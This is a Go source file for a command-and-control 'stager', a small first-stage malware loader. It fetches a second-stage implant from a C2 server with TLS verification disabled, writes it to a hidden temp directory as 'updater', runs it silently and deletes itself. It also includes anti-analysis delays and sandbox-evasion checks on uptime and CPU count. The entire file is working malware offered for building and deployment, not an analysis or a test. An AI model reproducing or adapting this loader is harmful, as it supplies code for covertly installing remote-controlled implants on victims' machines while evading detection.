// Ranger C3 Stager - Minimal initial payload
//
// Downloads and executes the full implant in memory.
// Designed to be small for initial deployment.
//
// Build:
//
//	go build -ldflags="-s -w" -o stager.exe ./cmd/stager
package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

var version = "3.0.0"

func main() {
	c2URL := flag.String("c2", "https://127.0.0.1:4443", "C2 server URL")
	payload := flag.String("payload", "implant", "Payload to fetch")
	key := flag.String("key", "", "Pre-shared session key hex")
	flag.Parse()

	// Anti-analysis: delay
	time.Sleep(time.Duration(5000+time.Now().UnixNano()%10000) * time.Millisecond)

	// Check environment
	if !envCheck() {
		os.Exit(0)
	}

	// Download implant from C2
	downloadURL := fmt.Sprintf("%s/api/v1/beacon?stage2=1&payload=%s", *c2URL, *payload)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}

	resp, err := client.Get(downloadURL)
	if err != nil {
		os.Exit(1)
	}
	defer resp.Body.Close()

	implantData, err := io.ReadAll(resp.Body)
	if err != nil || len(implantData) == 0 {
		os.Exit(1)
	}

	// Write implant to temp and execute
	tmpDir, err := os.MkdirTemp("", ".update-*")
	if err != nil {
		os.Exit(1)
	}
	defer os.RemoveAll(tmpDir)

	binName := "updater"
	if runtime.GOOS == "windows" {
		binName += ".exe"
	}
	implantPath := filepath.Join(tmpDir, binName)

	if err := os.WriteFile(implantPath, implantData, 0755); err != nil {
		os.Exit(1)
	}

	// Build args from key if provided
	args := []string{"--debug=false"}
	if *key != "" {
		args = append(args, "--key", *key)
	}
	args = append(args, "--c2", *c2URL+"/ws")

	cmd := exec.Command(implantPath, args...)
	cmd.Stdout = io.Discard
	cmd.Stderr = io.Discard

	if err := cmd.Start(); err != nil {
		os.Exit(1)
	}

	// Self-destruct
	selfDestruct()

	// Output success in JSON for logging
	info, _ := json.Marshal(map[string]any{
		"status":  "deployed",
		"pid":     cmd.Process.Pid,
		"version": version,
	})
	fmt.Println(string(info))
}

func envCheck() bool {
	// Simple uptime check
	if runtime.GOOS != "windows" {
		data, err := os.ReadFile("/proc/uptime")
		if err == nil {
			var uptime float64
			fmt.Sscanf(string(data), "%f", &uptime)
			if uptime < 300 {
				return false
			}
		}
	}
	return runtime.NumCPU() >= 2
}

func selfDestruct() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	if runtime.GOOS == "windows" {
		// Schedule deletion via cmd
		cmd := exec.Command("cmd.exe", "/C", fmt.Sprintf(
			"ping 127.0.0.1 -n 3 > nul & del %s", exe,
		))
		cmd.Start()
	} else {
		// Use at or direct deletion
		go func() {
			time.Sleep(3 * time.Second)
			os.Remove(exe)
		}()
	}
}
